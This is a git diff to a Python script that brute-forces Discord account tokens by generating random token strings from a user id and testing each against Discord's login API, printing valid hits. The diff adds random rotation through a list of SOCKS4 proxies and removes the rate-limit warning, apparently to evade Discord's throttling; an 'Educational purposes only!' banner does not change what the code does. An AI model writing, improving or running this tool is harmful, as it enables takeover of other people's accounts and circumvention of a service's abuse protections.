@@ -10,6 +10,12 @@ userid = str(userid)[2:-1]
 print("WARNING: Educational purposes only!")
 time.sleep(3)
 
+proxies = set()
+with open("./proxy/socks4.txt", "r") as file:
+    fline = file.readlines()
+    for line in fline:
+        proxies.add(line.strip())
+
 ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"
 
 while userid == userid:
@@ -21,12 +27,14 @@ while userid == userid:
         return ''.join(random.choice(chars) for _ in range(N))
 
     token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)
+    
+    proxy = {'socks4': 'socks4://'+random.choice(list(proxies))}
 
     headers={
     'Authorization': token
     }
     url = 'https://discordapp.com/api/v9/auth/login'
-    login = requests.get(url, headers=headers)
+    login = requests.get(url, headers=headers, proxies=proxy)
     try:
         if login.status_code == 200:
             print(Fore.GREEN + '[+] VALID' + ' ' + token)
@@ -35,9 +43,6 @@ while userid == userid:
             break
         else:
             print(Fore.RED + '[-] INVALID' + ' ' + token)
-
-        if login.status_code == 429:
-          print(Fore.YELLOW + f"[*] You get rate limited!")
     finally:
         print("")
 input()
